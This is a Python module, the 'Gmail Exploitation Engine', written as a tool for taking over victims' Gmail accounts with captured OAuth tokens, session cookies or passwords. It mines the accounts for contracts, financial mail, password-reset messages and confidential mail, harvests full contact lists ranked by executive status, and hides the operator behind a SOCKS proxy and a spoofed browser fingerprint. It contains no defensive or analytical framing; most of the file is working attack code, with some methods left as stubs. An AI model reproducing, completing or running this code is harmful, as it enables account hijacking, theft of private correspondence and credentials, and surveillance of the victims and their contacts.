"""
Gmail Exploitation Engine
Advanced Gmail access and data extraction module
"""

import asyncio
import json
import logging
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import httpx
from cryptography.fernet import Fernet
import base64

logger = logging.getLogger(__name__)

class GmailExploitationEngine:
    """Advanced Gmail exploitation engine for intelligence gathering"""
    
    def __init__(self):
        self.encryption_key = None
        self.opsec_manager = OperationalSecurityManager()
        self.data_classifier = DataClassifier()
        
    async def access_victim_gmail(self, victim_id: str, admin_user_id: str, access_method: str = 'oauth') -> Dict[str, Any]:
        """Secure Gmail access with full operational security"""
        
        # Setup OpSec environment
        opsec_session = await self.opsec_manager.create_secure_session(admin_user_id)
        
        try:
            # Get victim data from database
            victim = await self.get_victim_data(victim_id)
            
            # Select access method
            gmail_service = None
            if access_method == 'oauth' and victim.get('oauth_tokens'):
                gmail_service = await self.access_via_oauth(victim['oauth_tokens'], opsec_session)
            elif access_method == 'session' and victim.get('captured_cookies'):
                gmail_service = await self.access_via_session(victim['captured_cookies'], opsec_session)
            elif access_method == 'direct' and victim.get('password_hash'):
                gmail_service = await self.access_via_credentials(victim['email'], victim['password_hash'], opsec_session)
            
            if not gmail_service:
                raise GmailAccessError("No valid access method available")
            
            # Log access attempt
            await self.log_gmail_access(admin_user_id, victim_id, access_method, True)
            
            return gmail_service
            
        except Exception as e:
            await self.log_gmail_access(admin_user_id, victim_id, access_method, False, str(e))
            raise
        
        finally:
            # Cleanup OpSec session
            await self.opsec_manager.cleanup_session(opsec_session)
    
    async def extract_gmail_intelligence(self, gmail_service: Any, victim_id: str, extraction_config: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive Gmail data extraction and analysis"""
        
        extraction_results = {
            'emails': [],
            'contacts': [],
            'attachments': [],
            'calendar_events': [],
            'drive_files': [],
            'labels': [],
            'filters': []
        }
        
        # Extract emails with intelligent filtering
        if extraction_config.get('extract_emails', True):
            emails = await self.extract_emails_with_intelligence(
                gmail_service, 
                extraction_config.get('email_filters', {})
            )
            extraction_results['emails'] = emails
        
        # Extract contacts and analyze relationships
        if extraction_config.get('extract_contacts', True):
            contacts = await self.extract_and_analyze_contacts(gmail_service)
            extraction_results['contacts'] = contacts
        
        # Extract attachments and scan for sensitive content
        if extraction_config.get('extract_attachments', True):
            attachments = await self.extract_valuable_attachments(gmail_service)
            extraction_results['attachments'] = attachments
        
        # Additional data sources
        if extraction_config.get('extract_calendar', False):
            extraction_results['calendar_events'] = await self.extract_calendar_data(gmail_service)
        
        if extraction_config.get('extract_drive', False):
            extraction_results['drive_files'] = await self.extract_drive_intelligence(gmail_service)
        
        # Analyze and classify extracted data
        intelligence_analysis = await self.analyze_extracted_intelligence(extraction_results)
        
        # Store results with encryption
        await self.store_extracted_data(victim_id, extraction_results, intelligence_analysis)
        
        return {
            'extraction_results': extraction_results,
            'intelligence_analysis': intelligence_analysis,
            'extraction_summary': self.generate_extraction_summary(extraction_results)
        }
    
    async def extract_emails_with_intelligence(self, gmail_service: Any, filters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Advanced email extraction with content analysis"""
        
        # Define intelligent search queries
        intelligence_queries = [
            'subject:contract OR subject:agreement OR subject:deal',  # Business contracts
            'subject:invoice OR subject:payment OR subject:billing',  # Financial data
            'subject:password OR subject:reset OR subject:verification', # Security data
            'from:bank OR from:financial OR from:credit',             # Banking communications
            'subject:confidential OR subject:private OR subject:internal' # Confidential data
        ]
        
        valuable_emails = []
        
        for query in intelligence_queries:
            try:
                results = gmail_service.users().messages().list(
                    userId='me',
                    q=query,
                    maxResults=filters.get('max_per_query', 100)
                ).execute()
                
                for message_ref in results.get('messages', []):
                    # Get full message details
                    message = gmail_service.users().messages().get(
                        userId='me',
                        id=message_ref['id'],
                        format='full'
                    ).execute()
                    
                    # Analyze and classify email
                    email_analysis = await self.analyze_email_content(message)
                    
                    if email_analysis['value_score'] > 0.5:  # Only store valuable emails
                        valuable_emails.append({
                            'id': message['id'],
                            'thread_id': message['threadId'],
                            'subject': self.extract_header(message, 'Subject'),
                            'from': self.extract_header(message, 'From'),
                            'to': self.extract_header(message, 'To'),
                            'date': self.extract_header(message, 'Date'),
                            'body': self.extract_email_body(message),
                            'attachments': self.extract_attachment_info(message),
                            'analysis': email_analysis
                        })
                
            except Exception as e:
                logger.warning(f"Failed to extract emails for query '{query}': {e}")
        
        return valuable_emails
    
    async def extract_and_analyze_contacts(self, gmail_service: Any) -> List[Dict[str, Any]]:
        """Comprehensive contact intelligence extraction"""
        
        try:
            # Use People API to extract contacts
            people_service = build('people', 'v1', credentials=gmail_service._credentials)
            
            # Get all contacts
            contacts_result = people_service.people().connections().list(
                resourceName='people/me',
                pageSize=2000,
                personFields='names,emailAddresses,phoneNumbers,organizations,biographies,addresses,relations'
            ).execute()
            
            extracted_contacts = []
            
            for person in contacts_result.get('connections', []):
                # Extract contact information
                contact_data = {
                    'resource_name': person.get('resourceName'),
                    'names': person.get('names', []),
                    'email_addresses': person.get('emailAddresses', []),
                    'phone_numbers': person.get('phoneNumbers', []),
                    'organizations': person.get('organizations', []),
                    'biographies': person.get('biographies', []),
                    'addresses': person.get('addresses', []),
                    'relations': person.get('relations', [])
                }
                
                # Analyze contact value
                contact_analysis = await self.analyze_contact_intelligence(contact_data)
                contact_data['analysis'] = contact_analysis
                
                extracted_contacts.append(contact_data)
            
            return extracted_contacts
            
        except Exception as e:
            logger.error(f"Contact extraction failed: {e}")
            return []
    
    async def analyze_email_content(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze email content for intelligence value"""
        
        subject = self.extract_header(message, 'Subject', '')
        body = self.extract_email_body(message)
        
        # Keywords for different intelligence categories
        business_keywords = ['contract', 'agreement', 'deal', 'partnership', 'merger', 'acquisition']
        financial_keywords = ['invoice', 'payment', 'billing', 'loan', 'credit', 'investment', 'revenue']
        security_keywords = ['password', 'reset', 'verification', 'security', 'alert', 'suspicious']
        confidential_keywords = ['confidential', 'private', 'internal', 'classified', 'restricted']
        
        # Calculate value scores
        business_score = sum(1 for keyword in business_keywords if keyword.lower() in (subject + body).lower())
        financial_score = sum(1 for keyword in financial_keywords if keyword.lower() in (subject + body).lower())
        security_score = sum(1 for keyword in security_keywords if keyword.lower() in (subject + body).lower())
        confidential_score = sum(1 for keyword in confidential_keywords if keyword.lower() in (subject + body).lower())
        
        # Calculate overall value score
        total_score = business_score + financial_score + security_score + confidential_score
        value_score = min(total_score / 10.0, 1.0)  # Normalize to 0-1
        
        return {
            'value_score': value_score,
            'business_content': business_score > 0,
            'financial_content': financial_score > 0,
            'security_content': security_score > 0,
            'confidential_content': confidential_score > 0,
            'category_scores': {
                'business': business_score,
                'financial': financial_score,
                'security': security_score,
                'confidential': confidential_score
            }
        }
    
    async def analyze_contact_intelligence(self, contact_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze contact for intelligence value"""
        
        # Extract email domains
        email_domains = []
        for email_info in contact_data.get('email_addresses', []):
            email = email_info.get('value', '')
            if '@' in email:
                domain = email.split('@')[1]
                email_domains.append(domain)
        
        # Check for business domains
        business_domains = ['.com', '.org', '.net', '.co', '.biz']
        business_contact = any(any(bd in domain for bd in business_domains) for domain in email_domains)
        
        # Check for executive-level indicators
        executive_keywords = ['ceo', 'cto', 'cfo', 'president', 'director', 'manager', 'executive']
        names = [name.get('displayName', '') for name in contact_data.get('names', [])]
        organizations = [org.get('title', '') for org in contact_data.get('organizations', [])]
        
        executive_level = 0
        for keyword in executive_keywords:
            if any(keyword.lower() in name.lower() for name in names):
                executive_level += 1
            if any(keyword.lower() in org.lower() for org in organizations):
                executive_level += 1
        
        # Calculate intelligence value
        intelligence_value = 0.0
        if business_contact:
            intelligence_value += 0.3
        if executive_level > 0:
            intelligence_value += min(executive_level * 0.2, 0.5)
        if len(email_domains) > 1:
            intelligence_value += 0.2
        
        return {
            'intelligence_value': min(intelligence_value, 1.0),
            'business_contact': business_contact,
            'executive_level': executive_level,
            'email_domains': email_domains,
            'contact_quality': 'high' if intelligence_value > 0.7 else 'medium' if intelligence_value > 0.3 else 'low'
        }
    
    def extract_header(self, message: Dict[str, Any], header_name: str, default: str = '') -> str:
        """Extract header value from email message"""
        headers = message.get('payload', {}).get('headers', [])
        for header in headers:
            if header.get('name', '').lower() == header_name.lower():
                return header.get('value', default)
        return default
    
    def extract_email_body(self, message: Dict[str, Any]) -> str:
        """Extract email body text"""
        payload = message.get('payload', {})
        
        # Try to get plain text body
        if 'parts' in payload:
            for part in payload['parts']:
                if part.get('mimeType') == 'text/plain':
                    data = part.get('body', {}).get('data', '')
                    if data:
                        return base64.urlsafe_b64decode(data).decode('utf-8', errors='ignore')
        
        # Fallback to single part
        if payload.get('mimeType') == 'text/plain':
            data = payload.get('body', {}).get('data', '')
            if data:
                return base64.urlsafe_b64decode(data).decode('utf-8', errors='ignore')
        
        return ''
    
    def extract_attachment_info(self, message: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Extract attachment information from email"""
        attachments = []
        payload = message.get('payload', {})
        
        if 'parts' in payload:
            for part in payload['parts']:
                if part.get('filename'):
                    attachments.append({
                        'filename': part['filename'],
                        'mime_type': part.get('mimeType', ''),
                        'size': part.get('body', {}).get('size', 0),
                        'attachment_id': part.get('body', {}).get('attachmentId', '')
                    })
        
        return attachments
    
    async def store_extracted_data(self, victim_id: str, extraction_results: Dict[str, Any], intelligence_analysis: Dict[str, Any]) -> None:
        """Store extracted data with encryption"""
        # Implementation for storing encrypted data
        pass
    
    def generate_extraction_summary(self, extraction_results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate summary of extraction results"""
        return {
            'total_emails': len(extraction_results.get('emails', [])),
            'total_contacts': len(extraction_results.get('contacts', [])),
            'total_attachments': len(extraction_results.get('attachments', [])),
            'extraction_timestamp': datetime.now(timezone.utc).isoformat()
        }

class OperationalSecurityManager:
    """Operational security manager for Gmail access"""
    
    async def create_secure_session(self, admin_user_id: str) -> Dict[str, Any]:
        """Create secure operational session"""
        return {
            'admin_user_id': admin_user_id,
            'session_id': f"opsec_{admin_user_id}_{int(datetime.now().timestamp())}",
            'created_at': datetime.now(timezone.utc),
            'proxy_config': await self.get_proxy_config(),
            'fingerprint': await self.generate_admin_fingerprint()
        }
    
    async def cleanup_session(self, session: Dict[str, Any]) -> None:
        """Cleanup operational session"""
        # Implementation for session cleanup
        pass
    
    async def get_proxy_config(self) -> Dict[str, str]:
        """Get proxy configuration for secure access"""
        return {
            'proxy_type': 'socks5',
            'proxy_host': '127.0.0.1',
            'proxy_port': '1080'
        }
    
    async def generate_admin_fingerprint(self) -> Dict[str, Any]:
        """Generate admin fingerprint for tracking"""
        return {
            'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'screen_resolution': '1920x1080',
            'timezone': 'UTC'
        }

class DataClassifier:
    """Data classification engine for intelligence analysis"""
    
    def __init__(self):
        self.classification_rules = {
            'high_sensitivity': ['password', 'confidential', 'private', 'internal'],
            'medium_sensitivity': ['contract', 'agreement', 'financial', 'billing'],
            'low_sensitivity': ['newsletter', 'marketing', 'promotion']
        }
    
    def classify_data(self, content: str) -> str:
        """Classify data based on content"""
        content_lower = content.lower()
        
        for sensitivity, keywords in self.classification_rules.items():
            if any(keyword in content_lower for keyword in keywords):
                return sensitivity
        
        return 'low_sensitivity'

class GmailAccessError(Exception):
    """Custom exception for Gmail access errors"""
    pass